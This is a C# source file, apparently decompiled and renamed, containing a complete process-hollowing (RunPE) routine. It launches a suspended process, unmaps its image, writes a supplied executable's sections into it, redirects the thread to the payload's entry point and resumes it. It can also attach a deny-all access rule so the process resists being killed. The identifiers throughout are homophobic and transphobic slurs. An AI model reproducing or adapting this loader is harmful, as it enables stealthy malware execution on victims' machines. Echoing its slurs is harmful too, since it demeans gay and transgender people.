using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
//WINDOWS LIBRARY IMPORTS
// Token: 0x02000003 RID: 3
public static class WinLib
{
	// Token: 0x06000006 RID: 6

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
	private static extern bool CreateProcess(string faggotry1, string faggotry2, IntPtr faggotry3, IntPtr faggotry4, bool faggotry5, uint faggotry6, IntPtr faggotry7, string faggotry8, ref WinLib.ByteReadonlyShit faggotry9, ref WinLib.IntPointerShit faggotry10);

	// Token: 0x06000007 RID: 7
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool GetThreadContext(IntPtr faggotry1, int[] faggotry2);

	// Token: 0x06000008 RID: 8
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool Wow64GetThreadContext(IntPtr faggotry1, int[] faggotry2);

	// Token: 0x06000009 RID: 9
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool SetThreadContext(IntPtr faggotry1, int[] faggotry2);

	// Token: 0x0600000A RID: 10
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool Wow64SetThreadContext(IntPtr faggotry1, int[] faggotry2);

	// Token: 0x0600000B RID: 11
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool ReadProcessMemory(IntPtr faggotry1, int faggotry2, ref int faggotry3, int faggotry4, ref int faggotry5);

	// Token: 0x0600000C RID: 12
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool WriteProcessMemory(IntPtr faggotry1, int faggotry2, byte[] faggotry3, int faggotry4, ref int faggotry5);

	// Token: 0x0600000D RID: 13
	[SuppressUnmanagedCodeSecurity]
	[DllImport("ntdll.dll")]
	private static extern int NtUnmapViewOfSection(IntPtr faggotry1, int faggotry2);

	// Token: 0x0600000E RID: 14
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern int VirtualAllocEx(IntPtr faggotry1, int faggotry2, int faggotry3, int faggotry4, int faggotry5);

	// Token: 0x0600000F RID: 15
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern int ResumeThread(IntPtr faggotry);

	// Token: 0x06000010 RID: 16 RVA: 0x000028C0 File Offset: 0x00000AC0
	public static bool WierdBool(string faggotry1, byte[] faggotry2, bool faggotry3)
	{
		for (int i = 1; i <= 5; i++)
		{
			if (WinLib.BoolThatCreatesAProcess(faggotry1, faggotry2, faggotry3))
			{
				return true;
			}
		}
		return false;
	}

	// Token: 0x06000011 RID: 17 RVA: 0x00002908 File Offset: 0x00000B08
	private static bool BoolThatCreatesAProcess(string BoolThatCreatesAProcessArgument1D, byte[] ByteArgumentBoolProcess, bool BoolArgumentBoolProcess)
	{
		int num = 0;
		string @string = "#system32";
		WinLib.ByteReadonlyShit ByteReadonlyShit = default(WinLib.ByteReadonlyShit);
		WinLib.IntPointerShit IntPointerShit = default(WinLib.IntPointerShit);
		ByteReadonlyShit.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(WinLib.ByteReadonlyShit)));
		try
		{
			if (!WinLib.CreateProcess(BoolThatCreatesAProcessArgument1D, @string, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, null, ref ByteReadonlyShit, ref IntPointerShit))
			{
				throw new Exception();
			}
			int num2 = BitConverter.ToInt32(ByteArgumentBoolProcess, 60);
			int num3 = BitConverter.ToInt32(ByteArgumentBoolProcess, num2 + 26 + 26);
			int[] array = new int[179];
			array[0] = 65538;
			if (IntPtr.Size == 4)
			{
				if (!WinLib.GetThreadContext(IntPointerShit.ThreadHandle, array))
				{
					throw new Exception();
				}
			}
			else if (!WinLib.Wow64GetThreadContext(IntPointerShit.ThreadHandle, array))
			{
				throw new Exception();
			}
			int num4 = array[41];
			int num5 = 0;
			if (!WinLib.ReadProcessMemory(IntPointerShit.ProcessHandle, num4 + 4 + 4, ref num5, 4, ref num))
			{
				throw new Exception();
			}
			if (num3 == num5 && WinLib.NtUnmapViewOfSection(IntPointerShit.ProcessHandle, num5) != 0)
			{
				throw new Exception();
			}
			int int1boolproc = BitConverter.ToInt32(ByteArgumentBoolProcess, num2 + 80);
			int int2boolproc = BitConverter.ToInt32(ByteArgumentBoolProcess, num2 + 42 + 42);
			bool flag = false;
			int num6 = WinLib.VirtualAllocEx(IntPointerShit.ProcessHandle, num3, int1boolproc, 12288, 64);
			if (num6 == 0)
			{
				throw new Exception();
			}
			if (!WinLib.WriteProcessMemory(IntPointerShit.ProcessHandle, num6, ByteArgumentBoolProcess,int2boolproc, ref num))
			{
				throw new Exception();
			}
			int num7 = num2 + 248;
			short num8 = BitConverter.ToInt16(ByteArgumentBoolProcess, num2 + 3 + 3);
			for (int i = 0; i < (int)num8; i++)
			{
				int num9 = BitConverter.ToInt32(ByteArgumentBoolProcess, num7 + 6 + 6);
				int num10 = BitConverter.ToInt32(ByteArgumentBoolProcess, num7 + 8 + 8);
				int srcOffset = BitConverter.ToInt32(ByteArgumentBoolProcess, num7 + 20);
				if (num10 != 0)
				{
					byte[] array2 = new byte[num10];
					Buffer.BlockCopy(ByteArgumentBoolProcess, srcOffset, array2, 0, array2.Length);
					if (!WinLib.WriteProcessMemory(IntPointerShit.ProcessHandle, num6 + num9, array2, array2.Length, ref num))
					{
						throw new Exception();
					}
				}
				num7 += 40;
			}
			byte[] bytes = BitConverter.GetBytes(num6);
			if (!WinLib.WriteProcessMemory(IntPointerShit.ProcessHandle, num4 + 8, bytes, 4, ref num))
			{
				throw new Exception();
			}
			int num11 = BitConverter.ToInt32(ByteArgumentBoolProcess, num2 + 40);
			if (flag)
			{
				num6 = num3;
			}
			array[44] = num6 + num11;
			if (IntPtr.Size == 4)
			{
				if (!WinLib.SetThreadContext(IntPointerShit.ThreadHandle, array))
				{
					throw new Exception();
				}
			}
			else if (!WinLib.Wow64SetThreadContext(IntPointerShit.ThreadHandle, array))
			{
				throw new Exception();
			}
			if (WinLib.ResumeThread(IntPointerShit.ThreadHandle) == -1)
			{
				throw new Exception();
			}
			if (BoolArgumentBoolProcess)
			{
				WinLib.RawSecurityStuff1(IntPointerShit.ProcessHandle);
			}
		}
		catch
		{
			Process processById = Process.GetProcessById(Convert.ToInt32(IntPointerShit.ProcessId));
			processById.Kill();
			return false;
		}
		return true;
	}

	// Token: 0x06000012 RID: 18
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr faggotry1, int faggotry2, [Out] byte[] faggotry3, uint faggotry4, ref uint faggotry5);

	// Token: 0x06000013 RID: 19
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr faggotry1, int faggotry2, [In] byte[] faggotry3);

	// Token: 0x06000014 RID: 20 RVA: 0x00002CD8 File Offset: 0x00000ED8
	private static void ShitThatUsesKernelObjectSecurity(IntPtr faggotry1, RawSecurityDescriptor faggotry2)
	{
		byte[] array = new byte[checked(faggotry2.BinaryLength - 1 + 1 - 1 + 1)];
		faggotry2.GetBinaryForm(array, 0);
		bool flag = !WinLib.SetKernelObjectSecurity(faggotry1, 4, array);
		if (flag)
		{
			throw new Win32Exception();
		}
	}

	// This is unused Idk wat this is
	private static T SomeWierdTrannyStuff<T>(ref T TrannyShit1, T TrannyShit2)
	{
		TrannyShit1 = TrannyShit2;
		return TrannyShit2;
	}

	// Token: 0x06000016 RID: 22 RVA: 0x00002D44 File Offset: 0x00000F44
	private static RawSecurityDescriptor UsesRawSecDesc(IntPtr faggotry)
	{
		byte[] array = new byte[0];
		uint num = 0U;
		WinLib.GetKernelObjectSecurity(faggotry, 4, array, 0U, ref num);
		if (num < 0U || (ulong)num > 32767UL)
		{
			throw new Win32Exception();
		}
		bool flag = !WinLib.GetKernelObjectSecurity(faggotry, 4, WinLib.SomeWierdTrannyStuff<byte[]>(ref array, new byte[checked((int)(unchecked((ulong)num) - 1UL) + 1 - 1 + 1)]), num, ref num);
		if (flag)
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(array, 0);
	}

	// Token: 0x06000017 RID: 23 RVA: 0x00002DDC File Offset: 0x00000FDC
	private static void RawSecurityStuff1(IntPtr faggotry1)
	{
		RawSecurityDescriptor rawSecurityDescriptor = WinLib.UsesRawSecDesc(faggotry1);
		rawSecurityDescriptor.DiscretionaryAcl.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 987135, new SecurityIdentifier(WellKnownSidType.WorldSid, null), false, null));
		WinLib.ShitThatUsesKernelObjectSecurity(faggotry1, rawSecurityDescriptor);
	}

    
    // Token: 0x0600004C RID: 76 RVA: 0x00002256 File Offset: 0x00000456
  

    

    // Token: 0x02000004 RID: 4
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct IntPointerShit
	{
		// Token: 0x04000001 RID: 1
		public readonly IntPtr ProcessHandle;

		// Token: 0x04000002 RID: 2
		public readonly IntPtr ThreadHandle;

		// Token: 0x04000003 RID: 3
		public readonly uint ProcessId;

		// Token: 0x04000004 RID: 4
		private readonly uint ThreadId;
	}

	// Token: 0x02000005 RID: 5
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct ByteReadonlyShit
	{
		// Token: 0x04000005 RID: 5
		public uint Size;

		// Token: 0x04000006 RID: 6
		private readonly string Reserved1;

		// Token: 0x04000007 RID: 7
		private readonly string Desktop;

		// Token: 0x04000008 RID: 8
		private readonly string Title;

		// Token: 0x04000009 RID: 9
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
		private readonly byte[] Misc;

		// Token: 0x0400000A RID: 10
		private readonly IntPtr Reserved2;

		// Token: 0x0400000B RID: 11
		private readonly IntPtr StdInput;

		// Token: 0x0400000C RID: 12
		private readonly IntPtr StdOutput;

		// Token: 0x0400000D RID: 13
		private readonly IntPtr StdError;
	}

	// Token: 0x02000006 RID: 6
	private enum ProcessShit
	{
		// Token: 0x0400000F RID: 15
		DELETE = 65536,
		// Token: 0x04000010 RID: 16
		ITE_OWNER = 524288,
		// Token: 0x04000011 RID: 17
		PROCESS_ALL_ACCESS = 987135,
		// Token: 0x04000012 RID: 18
		PROCESS_CREATE_PROCESS = 128,
		// Token: 0x04000013 RID: 19
		PROCESS_CREATE_THREAD = 2,
		// Token: 0x04000014 RID: 20
		PROCESS_DUP_HANDLE = 64,
		// Token: 0x04000015 RID: 21
		PROCESS_QUERY_INFORMATION = 1024,
		// Token: 0x04000016 RID: 22
		PROCESS_QUERY_LIMITED_INFORMATION = 4096,
		// Token: 0x04000017 RID: 23
		PROCESS_SET_INFORMATION = 512,
		// Token: 0x04000018 RID: 24
		PROCESS_SET_QUOTA = 256,
		// Token: 0x04000019 RID: 25
		PROCESS_SUSPEND_RESUME = 2048,
		// Token: 0x0400001A RID: 26
		PROCESS_TERMINATE = 1,
		// Token: 0x0400001B RID: 27
		PROCESS_VM_OPERATION = 8,
		// Token: 0x0400001C RID: 28
		PROCESS_VM_READ = 16,
		// Token: 0x0400001D RID: 29
		PROCESS_VM_WRITE = 32,
		// Token: 0x0400001E RID: 30
		READ_CONTROL = 131072,
		// Token: 0x0400001F RID: 31
		STANDARD_RIGHTS_REQUIRED = 983040,
		// Token: 0x04000020 RID: 32
		SYNCHRONIZE = 256,
		// Token: 0x04000021 RID: 33
		WRITE_DAC = 262144
	}
}
